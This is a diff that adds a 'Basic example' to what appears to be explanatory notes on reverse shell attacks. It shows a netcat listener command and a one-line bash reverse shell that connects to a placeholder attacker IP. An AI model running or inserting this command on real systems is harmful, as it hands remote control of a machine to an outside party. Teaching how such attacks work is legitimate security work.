@@ -12,3 +12,15 @@ Attack flow:
 3. Attacker runs a reverse shell payload on the victim machine
 4. Victim machine connects back to the attacker's IP and port
 5. Attacker gets an interactive terminal session on the victim
+
+Basic example:
+
+```bash
+# Step 1 - Attacker sets up listener (on attacker's machine)
+nc -lvnp 4444
+
+# Step 2 - Reverse shell payload (run on victim machine)
+bash -i >& /dev/tcp/attacker_ip/4444 0>&1
+```
+
+Once the victim runs that one line, the attacker gets a fully interactive bash session on the victim machine.
